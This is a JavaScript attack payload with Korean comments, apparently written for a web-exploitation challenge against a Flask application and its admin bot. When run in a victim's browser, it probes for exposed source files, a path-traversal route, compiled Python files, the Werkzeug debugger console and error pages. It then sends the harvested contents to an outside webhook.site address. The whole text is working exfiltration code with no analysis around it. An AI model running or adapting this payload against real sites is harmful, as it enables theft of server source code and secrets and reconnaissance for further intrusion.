(async () => {
    const WEBHOOK = 'https://webhook.site/144fdef3-ea07-4316-bff4-7619115f30f3';

    // 1. 소스 코드 파일 직접 접근 시도
    // Flask가 정적 파일 규칙을 잘못 설정했거나, 루트에 파일이 노출된 경우 확인
    const filesToFetch = [
        '/bot.py',
        '/app.py',
        '/Dockerfile',
        '/static/../bot.py', // 상위 디렉토리 탐색(Traversal) 시도
        '/__pycache__/bot.cpython-311.pyc' // 컴파일된 파이썬 파일
    ];

    let fileResults = {};
    for (const path of filesToFetch) {
        try {
            const res = await fetch(path);
            if (res.status === 200) {
                fileResults[path] = await res.text();
            } else {
                fileResults[path] = `Status ${res.status}`;
            }
        } catch (e) {
            fileResults[path] = "Error";
        }
    }

    // 2. Werkzeug Debugger Console 확인
    // 디버거가 열려있다면 HTML에 "__debugger__" 같은 문자열이 포함됨
    let consoleResult = "Failed";
    try {
        const res = await fetch('/console');
        if (res.status === 200) {
            const text = await res.text();
            // 내용이 너무 길 수 있으므로 특정 키워드나 앞부분만 자름
            consoleResult = text.includes('Werkzeug') ? "Active! (Werkzeug Found)" : "Inactive";
            // 만약 Active라면 전체 HTML을 훔쳐야 함 (이번엔 생략하고 상태만 확인)
        } else {
            consoleResult = `Status ${res.status}`;
        }
    } catch (e) {
        consoleResult = e.toString();
    }

    // 3. 강제 에러 유발 (Traceback 확인)
    // 존재하지 않는 템플릿이나 잘못된 입력을 보내 500 에러 유도
    // (이 앱은 404를 잘 처리하므로, 로직 에러를 찾아야 함. 
    //  예: POST 데이터 없이 /note/new 호출 등은 200 OK라서 어려움)
    // 여기선 단순히 이상한 경로 호출로 Flask 디폴트 에러 페이지 확인
    let errorPageResult = "";
    try {
        // Flask는 보통 리소스가 없으면 404지만, 
        // URL 길이 제한 초과 등을 이용해 서버 에러를 유발할 수도 있음.
        // 일단은 404 페이지에 디버그 정보가 있는지 확인
        const res = await fetch('/this_page_does_not_exist_xyz');
        errorPageResult = await res.text();
    } catch(e) {}

    // 데이터 전송
    const data = {
        msg: "Server Leak Probe",
        files: fileResults,
        debuggerStatus: consoleResult,
        errorPageSample: errorPageResult.substring(0, 500), // 앞부분만 확인
        location: window.location.href
    };

    fetch(WEBHOOK, {
        method: 'POST',
        mode: 'no-cors', // CORS 무시하고 보냄
        body: JSON.stringify(data)
    });
})();
